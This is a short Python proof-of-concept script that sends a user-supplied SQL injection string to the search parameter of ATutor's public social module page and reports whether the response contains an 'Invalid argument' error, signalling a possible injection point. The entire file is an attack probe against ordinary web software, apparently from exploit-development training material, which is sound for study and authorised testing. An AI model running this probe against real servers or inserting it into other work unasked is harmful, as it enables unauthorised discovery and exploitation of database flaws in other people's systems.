import sys
import re
import requests
from bs4 import BeautifulSoup

def searchFriends_sqli(ip, inj_str):
    target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    print ("Response Headers:\n"+str(r.headers)+"\n")
    print ("Response Content:"+str(s.text)+"\n")
    error = re.search("Invalid argument", s.text)
    if error:
        print ("Errors found in response. Possible SQL injection found")
    else:
        print ("No errors found")

def main():
    if len(sys.argv) != 3:
        print ("(+) usage: poc.py <target> <injection_string>")
    ip = sys.argv[1]
    injection_string = sys.argv[2]

    searchFriends_sqli(ip, injection_string)

if __name__ == "__main__":
    main()